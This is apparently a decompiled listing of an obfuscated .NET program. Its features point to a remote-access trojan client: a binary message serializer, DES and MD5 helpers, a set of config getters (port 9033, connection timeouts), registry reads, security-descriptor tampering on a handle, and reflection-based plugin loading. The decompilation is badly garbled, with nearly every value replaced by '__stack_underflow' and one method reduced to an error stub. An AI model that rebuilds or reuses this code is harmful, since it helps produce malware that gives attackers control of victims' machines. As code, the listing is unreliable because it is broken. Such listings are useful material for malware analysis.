    ((2 != 0 ? this : this)).ctor();
    return;
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
private static void .cctor()
{
    if (6 != 0)
    {
        #=qqLNJOrQl$9SirTNF5ZKaLA== = __stack_underflow;
    }
    if (7 != 0)
    {
        #=qyow7wBpiCNNIoap9jI9L3Q== = __stack_underflow;
    }
    if (4 != 0)
    {
        #=qrQRxQdT4MC1qfwOd4n14uA== = __stack_underflow;
    }
    if (1 != 0)
    {
        #=qYfWGXuhZd0cmWjiCvW2EPw== = __stack_underflow;
    }
    #=qru2ORBLxmt_CUDya_FEQGA== = new System.IO.BinaryWriter(#=qYfWGXuhZd0cmWjiCvW2EPw==);
    #=q7rZvZ5LmWDFo52hBeGb87g== = new List<object>();
    #=qoT5qP9FYCI8F5V3gKO7eMg== = new Dictionary<System.Type, byte>();
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Boolean), 0);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Byte), 1);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(byte[]), 2);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Char), 3);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(char[]), 4);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Decimal), 5);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Double), 6);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Int32), 7);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Int64), 8);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(SByte), 9);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Int16), 10);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Single), 11);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(String), 12);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(UInt32), 13);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(UInt64), 14);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(UInt16), 15);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(DateTime), 16);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(string[]), 17);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Guid), 18);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Size), 19);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Rectangle), 20);
    #=qoT5qP9FYCI8F5V3gKO7eMg==.Add(typeof(Version), 21);
    return;
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
public static void #=qdPDxrK7XRQZlwY8QeW6oe0AEoOr3qND_WVi1o6l48tc=(byte[] arg1)
{
    System.Security.Cryptography.DESCryptoServiceProvider local0;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    local0.BlockSize = 64;
    local0.Key = arg1;
    local0.IV = arg1;
    if (2 != 0)
    {
        #=qAySeqCaPs9tWWTa_P8M4Zg== = __stack_underflow;
    }
    if (6 != 0)
    {
        #=qp4XZ9Ss3K04S36I$7WhtwQ== = __stack_underflow;
    }
    return;
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
public static byte[] #=qy2xCoaL3Dm6E0MYt7i8x7A==(object[] arg1)
{
    System.Guid local1;

    return #=qth3CIdKay4zIa5SBJzx7eA==(true, 0, 0, (2 != 0 ? local1 : local1), (3 != 0 ? arg1 : arg1));
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
public static object[] #=qXULhMbqiur_al62NrjaiXWJ8rme0bKMO8KkV356NZwk=(byte[] arg1)
{
    #=qxe_BfLLMHqYa_KBeLsRfpw== local1;

    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    return (&local1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==;
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
public static byte[] #=qth3CIdKay4zIa5SBJzx7eA==(bool arg1, byte arg2, byte arg3, System.Guid arg4, object[] arg5)
{
    byte[] local0;
    byte[] local1;
    byte[] local2;
    byte local3;
    System.Type local4;
    int local5;
    string local6;
    System.Drawing.Size local7;
    System.Drawing.Rectangle local8;
    System.IO.Compression.DeflateStream local9;
    System.IO.MemoryStream local10;
    System.Guid local11;
    int local12;
    System.DateTime local14;
    int local15;
    string[] local16;
    System.Guid local17;

    if (4 != 0)
    {
        local10 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local10);
    try
    {
        #=qru2ORBLxmt_CUDya_FEQGA==.Write(arg1);
        #=qru2ORBLxmt_CUDya_FEQGA==.Write(arg2);
        #=qru2ORBLxmt_CUDya_FEQGA==.Write(arg3);
        if (!(arg4 == local11))
        {
            #=qru2ORBLxmt_CUDya_FEQGA==.Write(true);
            #=qru2ORBLxmt_CUDya_FEQGA==.Write(arg4.ToByteArray());
        }
        else
        {
            #=qru2ORBLxmt_CUDya_FEQGA==.Write(false);
        }
    }
    finally
    {
    }
    return local0;
}
// #=qVxXNKnhAcArgJoGGYXiyyQ==
public static #=qxe_BfLLMHqYa_KBeLsRfpw== #=qOsVShdMttD8jGLf8zW9G7g==(byte[] arg1)
{
    #=qxe_BfLLMHqYa_KBeLsRfpw== local0;
    byte local1;
    #=qxe_BfLLMHqYa_KBeLsRfpw== local2;
    byte[] local3;
    System.IO.Compression.DeflateStream local4;
    int local5;
    string[] local6;
    int local7;
    object local8;
    System.Guid local9;
    int local11;
    System.Drawing.Size local12;
    System.Drawing.Rectangle local13;

    if (3 != 0)
    {
        local8 = __stack_underflow;
    }
    Microsoft.VisualBasic.CompilerServices.ObjectFlowControl.CheckForSyncLockOnValueType(local8);
    System.Threading.Monitor.Enter(local8);
    try
    {
        if (8 != 0)
        {
            arg1 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local0;
}
// #=qWCa2pDyuMnzTMLUOIIx_zqZ1n0nAbCh3XpyakFsKTbQ=
public static void #=qCeF2tfSXulrE0bbyPxU$1ik7Jf3avSO4FKBmKNH9QLg=(byte[] arg1, #=qbbSw65PC$nto6DJiWxTawg== arg2)
{
    System.Reflection.ConstructorInfo local0;
    #=qbOmsEb0zGpdZukI0D4Idug== local1;
    System.Collections.Generic.List<object> local2;
    System.Type local3;
    object local4;
    System.Reflection.ParameterInfo local5;
    System.Type local6;
    System.Exception local7;
    int local8;
    System.Reflection.ParameterInfo[] local9;
    int local10;
    System.Type[] local11;

    try
    {
        if (3 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qWCa2pDyuMnzTMLUOIIx_zqZ1n0nAbCh3XpyakFsKTbQ=
public static #=qbbSw65PC$nto6DJiWxTawg== #=qSl7F7iXGTH9iNXHds05fxcgA7Cydd52A6vZtHH_41F4=(System.Guid arg1)
{
    int local1;
    int local2;

    if (3 != 0)
    {
        local2 = __stack_underflow;
    }
    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    while (true)
    {
        if (local1 <= local2)
        {
            if (!(#=q0yJsLo0aFpSu9ky8R9f$lw==[local1].#=q7Kx5VWqZvUxLZ2L5c7WH8A== == arg1))
            {
                if (5 != 0)
                {
                    local1 = __stack_underflow;
                    continue;
                }
                else
                {
                    continue;
                }
            }
            return #=q0yJsLo0aFpSu9ky8R9f$lw==[local1];
        }
    }
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static System.DateTime #=qCgU$tDqtOAyz2b$RwfSF7UzBcCAr0rFJWxm16x7Lre0=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959351), UtcNow);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static System.Version #=qeD3MBfedCIuKIQf9V1u2N3YS4VXE_FOHqw_XAjWtZK8=()
{
    return (Version)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959335), new System.Version(0, 0, 0, 0));
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static System.Guid #=q$mvEHEBkZud$AdHPWqsMQnw5Xm5sD4vBSSmqrKuXGOk=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959253), Empty);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qZaN94n8dM6tBEf$qCdY2kbTZb5BOW8Z134$2tNv7EJs=()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959233), #=q00kXQ$0a$SV9DIgRtf4NWQ==(516959282));
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qtlZnL8mho$rv1eTFz0Mw9UYFC_yCabEZ0xtVePn6wR5aSHE7ti3UfKg2l7D0_xk8()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959264), #=q00kXQ$0a$SV9DIgRtf4NWQ==(516959708));
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qVS$QmQjvFfsXSqQAKGSl6HGbkse2SG0XCab4upVjtRJkvhTEk$oIS2I9Zja7id1Q()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959692), Empty);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static ushort #=qxJg7RxTW1v5mnt12xXeJiYJv_bcctbtL2BCD5MjDi45Hlz6t8vwDNTv1Rv7tgIct()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959721), 9033);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qp$ZVC1r9spi890l$D7IwEd3faoKeWHvv42mVq8wIIWM=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959644), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qCoWHlVuoVRMkOzC7RZubJCslkxaEWn9yZiIydECf69$ktj0IPD5wAwC2H5Cc8C$L()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959665), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qqs1moO$mYaS72OXOWe0Z6GycslEb6e9Ipoy7ppW0O5abIp05ajv8doqdJZHlN3cK()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959654), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static byte[] #=qyEH54IW$f9fUJb7FOR8r3vj6e$onLGrpm2VGycjbl9TZJEqkwtA4y4bL9ExOWpiA()
{
    return (byte[])#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959559), null);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qui$hq6ka6v3VYA7sCjpJmcmNECKESf33DUzrmeSOmg8_E_GsgWi7VMMVWUGuO5wH()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959592), true);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=q4P_5NYDHZX9MPbDZuNFOAbRpAmJ2c_TFz8M5ulhIFApTRNfzn3_E1__1$MVw8$WV()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959490), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qenWi8guqQrvoGB55djo0ka_844yTmViBn5_Fr2X6HAceO7AJErk_Rh7nfkfqtUbq()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959549), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qRACckQ0ejzlKZgeXX_CPJUyKbl7Zu7QfhWW6eMM03VPusMYB8LREfJZQVcTGHBm_()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959956), true);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=qmvGJ0E7$XHigSQAtHtZ6z$on2iAwFLBiFtrUR$DFhQPAtVI2LIgzNztIgPvlO9K$()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959951), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=q8Lz$o21atQxw0qUwF07ufqfk8jjJrspNc$L9E2y_kjQA$2GQzuj5BmjDMXRcd0oL()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959972), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qgPQkZ3GBDc371jzhubcNPqmxfqhr7b78DNmenmuxGa8=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959898), 0);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qhq3FXVXLOItNPwDlpFnTKHk3JkInaJiiSE3uR3jtGH8=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959883), 4000);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qmzYu_D9f4dvUPauEaU7zvyNjCyGp_73Xn5SffrcfQAU=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959932), 5000);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qXjNBjXFhVcOvrRAG8alfq96_gJ4jOa0wwNOaztY3QjLWnMT6wXGDzBnHuUkef5N0()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959825), 5000);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qXOmEbR_8DUzPz6sW4Kmd6kaKUIQOYZdTpvq2CkB17PTlG1zEUgI_P4skJXU2VwtO()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959815), 30000);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=q5s6lzZCgRNNe2Z9HZfa94HOHkpUfSnAwZsGo$hzh7hY=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959868), 2500);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qqsKAc3v0igxVSmn4Feg8q$1tNTWiqtCBpA_xMlgU$f8=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959761), 2500);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qr1BSJWWt4_gjKhDM1XdrUmEEDWmH$7z1xaJvthJ97EQ=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959744), 8000);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qScWgGHvDwJ0da_7qXoO28aGE1ea7zp5$XjEJLTXkuHQ=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959795), 65535);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qDJlWEiuGwuVXAz8yc8z7OaMssRYN4hP9AHespNOmdYHus6_1XkNOC0rqgHeRZksg()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959778), 10485760);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static int #=qGHv1IOurZ6januU0XCThS7E6H0kqAtBD9d30RkoHFXM=()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960214), 10485760);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=q6pErmyx6x4$YkotXXEXGCt_ysi5JdNm1fpNgnUvZ9LE6EtA8E0TapqXrPnqyBO1x()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960200), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qNzt$mJakh1Nxv4vDRDjTsa1OVDKMAlRCO__qncxMoXRz8jNE7AWvE0B4WIqANR1p()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960227), Empty);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qrPQtMswclvOlK1AxL1S4K8M$owLGUpQfjJA8CWW$fj1az7m8LFibY8IeMxHKi4wi()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960152), Empty);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static bool #=q3TG8MLoZf1Y44PREVW$6m76IGmuYE_BOhC_OTjkQJFtYWwRtSeFqevP9hiteuLfz()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960142), false);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qpNR_LpdLu_eSOZVgxbr8UFRlKjbiBX7LOuGAbGS07mXUJI3AAilu14uPN_kfaTpW()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960173), Empty);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static string #=qD_C1_4vUU8j6eQSUvsJDw_O6DZliNi$NDCaON05RwdmBpVqAu68W00hmx80mCKp6()
{
    return (String)#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960075), Empty);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static byte #=qK4wGebauvtmTKO0oAyLFzHLhr9rU3HNJmU_ur7Zop$YvLzV4HzmIQ45YslW_q1Vc()
{
    return *#=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516960107), 0);
}
// #=qWrm21vQ8CBMZP_RBTwpusA==
public static object #=qTSoRMaNGYiiBNK9Yfq59T$2z3sNScYh9uxoeWlhnD_A=(string arg1, object arg2)
{
    if (!#=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc=.ContainsKey((3 == 0 ? arg1 : arg1)))
    {
        return #=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc=[(0 == 0 ? arg1 : arg1)];
    }
    return (6 != 0 ? arg2 : arg2);
}
// #=qWsrg06gTzsE5hhHu57fJFw==
public void .ctor()
{
    ((1 != 0 ? this : this)).ctor();
    return;
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
public static string #=q9DR9MBj4z9rQMPU2Q48EqjtFhU8AMGWHK02_s7IakJ8=(string arg1, string arg2)
{
    System.Text.StringBuilder local0;
    nint local2;
    int local3;
    nuint local4;
    int local5;

    local4.ctor(-2147483646);
    if (#=qCKX0qzAtjLAL9KBPrJWkOA==(local4, arg1, 0, 131353, out local2) != 0)
    {
        return Empty;
    }
    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(#=qsqmAgLqQh_pOiJq5Mcf5Ii66zl6iLnAX8VtqTy$uxhY=(local2, arg2, (6 != 0 ? (local5 = 0) : 0), out local5, local0, out local3) != 0))
    {
        if (2 != 0)
        {
            local0 = __stack_underflow;
        }
        local5 = 0;
        #=qsqmAgLqQh_pOiJq5Mcf5Ii66zl6iLnAX8VtqTy$uxhY=(local2, arg2, 0, ref local5, local0, out local3);
    }
    #=qrmavK4kbgFTgX3_IUlEoRw==(local2);
    if (local0 == null)
    {
        return Empty;
    }
    return local0.ToString();
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
public static bool #=qiY1B9yU2oVkPHxhn$y67SFTP8x1Jb0botGqdUGkdpQg=()
{
    bool local0;
    System.Security.AccessControl.CommonAce local1;
    System.Security.Principal.SecurityIdentifier local2;
    System.Security.AccessControl.RawSecurityDescriptor local3;
    System.Exception local4;

    try
    {
        if (5 != 0)
        {
            local3 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return local0;
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
public static bool #=q3S7bY847GmpPliI1m7tZaAVifJNdeHclZJyeY2JTxN8=()
{
    bool local0;
    System.Exception local1;

    try
    {
        if (4 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return local0;
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
private static System.Security.AccessControl.RawSecurityDescriptor #=qNz_Hz8DMWPqA8pVcg8d0UVymwvCurvyYgdZaMK3OhQE=()
{
    byte[] local1;
    System.Security.AccessControl.DiscretionaryAcl local2;

    if (-1 != 0)
    {
        local2 = __stack_underflow;
    }
    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    local2.GetBinaryForm(local1, 0);
    return new System.Security.AccessControl.RawSecurityDescriptor(4, null, null, null, new System.Security.AccessControl.RawAcl(local1, 0));
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
private static bool #=q$JqWZLd6UPV3jmsDHksd2EmkHWISQtPlvGx8vZ7hHXE=(System.Security.AccessControl.RawSecurityDescriptor arg1)
{
    byte[] local0;

    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    arg1.GetBinaryForm(local0, 0);
    return #=qCgskv3QU4cEy8M7hqvNNBbFyow$DvbmSQrN8A5JJJWs=(#=q3LvM$oW1poDdLKDT_N_s4w==, 4, local0);
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
public static bool #=qtNbB44E34Ui_i5yJYQ5ntw==(byte[] arg1, byte[] arg2)
{
    int local1;
    int local2;

    if (checked((int)arg1.Length) != checked((int)arg2.Length))
    {
        return false;
    }
    if (1 != 0)
    {
        local2 = __stack_underflow;
    }
    if (5 != 0)
    {
        local1 = __stack_underflow;
    }
    while (true)
    {
        if (local1 <= local2)
        {
            if (arg1[local1] == arg2[local1])
            {
                if (8 != 0)
                {
                    local1 = __stack_underflow;
                    continue;
                }
                else
                {
                    continue;
                }
            }
            return false;
        }
    }
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
public static string #=qxQTn_t1ZFKKNm77mQ5vH9cInicm2Cv9jGtv9vmIpksI=(System.Exception arg1)
{
    string local1;

    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    if (local1.Length > 4096)
    {
        if (5 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    return local1;
}
// #=qxb6WVOMh6wjcZFY_Q0MJOQ==
private static string #=q6OqJPhANvYfkdc5uh_IKsUbLoI4zVFCxs4fpu7Vxr_U=(System.Exception arg1)
{
    System.Text.StringBuilder local1;

    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    local1.AppendLine(arg1.Message);
    local1.AppendLine();
    local1.AppendLine(arg1.GetType().FullName);
    local1.AppendLine(arg1.StackTrace);
    if (arg1.InnerException != null)
    {
        local1.AppendLine();
        local1.AppendLine(#=q6OqJPhANvYfkdc5uh_IKsUbLoI4zVFCxs4fpu7Vxr_U=(arg1.InnerException));
    }
    return local1.ToString();
}
// #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
private static void .cctor()
{
    if (1 != 0)
    {
        #=qGjp0Vb6efONwANkcKrMTkIBxJvr9AleFfJriudyTw3c= = __stack_underflow;
    }
    return;
}
// #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
public static System.Type #=qKU0J1fiP8KA33eFK1owekQ==(byte[] arg1, System.Type[] arg2, System.Type[] arg3)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_00A1 has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // System.Reflection.Assembly local0;
    // System.Reflection.ConstructorInfo[] local2;
    // System.Type local3;
    // System.Type local4;
    // System.Reflection.ParameterInfo local5;
    // int local6;
    // System.Type[] local7;
    // int local8;
    // System.Type[] local9;
    // int local10;
    // System.Reflection.ParameterInfo[] local11;
    // if (0 == 0)
    // {
    // local0 = __stack_underflow;
    // }
    // if (5 != 0)
    // {
    // local7 = __stack_underflow;
    // }
    // if (-1 != 0)
    // {
    // local6 = __stack_underflow;
    // }
    // IL_00A7:;
    // while (true)
    // {
    // if (local6 < checked((int)local7.Length))
    // {
    // local3 = local7[local6];
    // local9 = local3.GetInterfaces();
    // local8 = 0;
    // while (true)
    // {
    // if (local8 < checked((int)local9.Length))
    // {
    // local4 = local9[local8];
    // if (System.Array.IndexOf(arg2, local4) == -1)
    // {
    // local8 = local8 + 1;
    // continue;
    // }
    // return local3;
    // }
    // else
    // {
    // local2 = local3.GetConstructors();
    // if (checked((int)local2.Length) != 1)
    // {
    // IL_00A1:;
    // local6 = local6 + 1;
    // goto IL_00A7;
    // }
    // else
    // {
    // local11 = local2[0].GetParameters();
    // local10 = 0;
    // while (true)
    // {
    // if (local10 < checked((int)local11.Length))
    // {
    // local5 = local11[local10];
    // if (System.Array.IndexOf(arg3, local5.ParameterType) == -1)
    // {
    // local10 = local10 + 1;
    // continue;
    // }
    // return local3;
    // }
    // else
    // {
    // goto IL_00A1;
    // }
    // }
    // }
    // }
    // }
    // }
    // }
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
public static byte[] #=qOicuy1VnndMMXIrDqqx3EA==(string arg1)
{
    System.Security.Cryptography.MD5CryptoServiceProvider local0;

    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    return local0.ComputeHash(UTF8.GetBytes(arg1));
}
// #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
public static byte[] #=q8d8q1KZbTCKTAZreko1Lug==(byte[] arg1)
{
    System.Security.Cryptography.MD5CryptoServiceProvider local0;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    return local0.ComputeHash(arg1);
}
// #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
public static string #=qJ598Vnr_RIwGnHqFfQsYCw==(System.IO.Stream arg1)
{
    System.Security.Cryptography.MD5CryptoServiceProvider local0;

    if (2 != 0)
    {
        local0 = __stack_underflow;
    }
    return System.BitConverter.ToString(local0.ComputeHash(arg1)).Replace(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957929), Empty);
}
// #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
public static string #=qiJXCsKWBF9DB88uzW4b92A==(System.IO.Stream arg1, int arg2, long arg3)
{
    byte[] local0;
    System.Security.Cryptography.MD5CryptoServiceProvider local1;
    long local3;
    int local4;
    int local5;

    if (2 != 0)
    {
        local0 = __stack_underflow;
    }
    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    arg1.Position = unchecked((long)0);
    while (true)
    {
        if (5 != 0)
        {
            local5 = __stack_underflow;
        }
    }
    local1.TransformFinalBlock(new System.Byte[0], 0, 0);
    return System.BitConverter.ToString(local1.Hash).Replace(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957929), Empty);
}
// #=qZvjD49iuetyLKBIiF$ZmjA==
public void .ctor(#=qbOmsEb0zGpdZukI0D4Idug== arg1)
{
    if (4 != 0)
    {
        __stack_underflow.#=qK$702nkzQ4rQ0lJLQZ2zaw== = __stack_underflow;
    }
    return;
}
// #=qZvjD49iuetyLKBIiF$ZmjA==
public void Restart()
{
